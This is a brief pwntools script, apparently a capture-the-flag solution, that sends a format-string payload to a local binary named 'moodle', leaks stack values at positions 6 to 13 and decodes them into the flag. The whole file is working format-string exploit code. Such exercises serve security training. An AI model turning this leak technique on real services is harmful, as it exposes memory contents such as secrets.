from pwn import *
exe = './moodle'
io = process(exe)

flag = ''

# flag in stack 6 - 13
payload = b'%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p'
io.sendline(payload)

io.recvlines(2)
leak = io.recvline().split()

for leaks in leak:
    hex = unhex(leaks.split()[0][2:].decode())
    flag += hex.decode().strip()

print(flag)
io.interactive()